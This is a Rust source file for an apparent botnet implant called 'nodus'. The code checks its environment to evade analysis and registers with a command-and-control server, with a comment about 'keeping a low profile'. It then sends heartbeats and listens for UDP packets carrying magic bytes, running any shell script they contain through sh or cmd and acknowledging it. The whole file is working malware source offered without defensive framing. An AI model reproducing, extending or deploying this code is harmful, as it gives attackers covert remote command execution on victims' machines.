mod anti_analysis;
mod c2com;
mod identity;

use std::net::SocketAddr;
use tokio::{
    signal,
    sync::mpsc,
    time::{Duration, interval, sleep},
};

use crate::{c2com::C2Com, identity::Identity};

enum Command {
    Heartbeat,
    Shutdown,
}

const MAGIC_1: u8 = 77;
const MAGIC_2: u8 = 33;
const SHUTDOWN_COMMAND_TYPE: u8 = 0;
const SHELL_SCRIPT_COMMAND_TYPE: u8 = 1;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("nodus starting...");
    anti_analysis::check_environment();

    let identity = identity::init();
    let mut c2com = c2com::init();
    register_self(&mut c2com, &identity).await;

    let (tx, rx) = mpsc::channel::<Command>(32);
    let worker_thread = tokio::spawn(worker_loop(c2com, identity, rx));

    let mut heartbeat_tick = interval(Duration::from_secs(5));
    loop {
        tokio::select! {
            _ = signal::ctrl_c() => {
                println!("shutting down...");
                let _ = tx.send(Command::Shutdown).await;
                let _ = worker_thread.await;
                return Ok(());
            }
            _ = heartbeat_tick.tick() => {
                let _ = tx.send(Command::Heartbeat).await;
            }
        }
    }
}

async fn register_self(c2com: &mut C2Com, identity: &Identity) {
    println!("+--- attempting registration ---+");

    let mut registration_attempts = 0u8;
    loop {
        // technically the node should forever try to register itself while keeping a low profile.
        // but it could be an option to make a node die if it struggles too much.
        if registration_attempts >= 5 {
            eprintln!(" - registration completely failed. exiting...");
            std::process::exit(0);
        }

        match c2com::payloads::registration(identity) {
            Ok(payload) => match c2com.ask(&payload).await {
                Ok(response) => {
                    if let Some(resp_data) = response
                        && resp_data == b"ACK"
                    {
                        println!(" - registration succeeded.");
                        break;
                    }

                    println!(" - improper response from c2 during registration.");
                }
                Err(err) => {
                    println!(" - registration failed. {err}");
                }
            },
            Err(err) => {
                println!(" - registration payload build failed. {err}");
            }
        }

        registration_attempts += 1;
        sleep(Duration::from_secs(5)).await; // maybe make it a random delay each iteration.
    }
}

async fn worker_loop(mut c2com: C2Com, identity: Identity, mut rx: mpsc::Receiver<Command>) {
    loop {
        tokio::select! {
            cmd = rx.recv() => match cmd {
                Some(Command::Heartbeat) => {
                    c2com.heartbeat(&identity).await;
                }
                Some(Command::Shutdown) | None => {
                    break;
                }
            },

            listen_result = c2com.listen(0) => match listen_result {
                Ok(Some((data, addr))) => {
                    handle_incoming(&c2com, &data, addr).await;
                },
                Ok(None) => {}
                Err(err) => {
                    eprintln!(" - listen failed. {err}");
                }
            }
        }
    }
}

async fn handle_incoming(c2com: &C2Com, data: &[u8], from: SocketAddr) {
    if data.len() < 3 || data[0] != MAGIC_1 || data[1] != MAGIC_2 {
        eprintln!("cmd!! dropping packet from {from} with bad magic/length.");
        return;
    }

    match data[2] {
        SHUTDOWN_COMMAND_TYPE => {
            println!("cmd<< received shutdown command from {from}");
            if let Err(err) = c2com.send_bytes_to(from, b"ACK").await {
                eprintln!("cmd!! failed to ack shutdown: {err}");
            }

            // small pause so the udp packet gets flushed before we exit
            sleep(Duration::from_millis(200)).await;
            println!("nodus exiting per shutdown command.");
            std::process::exit(0);
        }
        SHELL_SCRIPT_COMMAND_TYPE => {
            if data.len() < 7 {
                eprintln!("cmd!! shell command packet too short.");
                return;
            }

            let script_len =
                u32::from_be_bytes([data[3], data[4], data[5], data[6]]) as usize;

            if data.len() < 7 + script_len {
                eprintln!("cmd!! shell script payload truncated.");
                return;
            }

            let script = match std::str::from_utf8(&data[7..7 + script_len]) {
                Ok(s) => s,
                Err(err) => {
                    eprintln!("cmd!! shell script not valid utf-8: {err}");
                    return;
                }
            };

            println!("cmd<< received shell script ({} bytes) from {from}", script_len);
            execute_shell(script).await;

            if let Err(err) = c2com.send_bytes_to(from, b"ACK").await {
                eprintln!("cmd!! failed to ack shell script: {err}");
            }
        }
        other => {
            eprintln!("cmd!! unknown command type: {other} from {from}");
        }
    }
}

async fn execute_shell(script: &str) {
    let result = if cfg!(windows) {
        tokio::process::Command::new("cmd")
            .args(["/C", script])
            .output()
            .await
    } else {
        tokio::process::Command::new("sh")
            .args(["-c", script])
            .output()
            .await
    };

    match result {
        Ok(out) => {
            println!("cmd-- shell exit: {}", out.status);
            if !out.stdout.is_empty() {
                print!("{}", String::from_utf8_lossy(&out.stdout));
            }
            
            if !out.stderr.is_empty() {
                eprint!("{}", String::from_utf8_lossy(&out.stderr));
            }
        }
        Err(err) => {
            eprintln!("cmd!! shell execution failed: {err}");
        }
    }
}
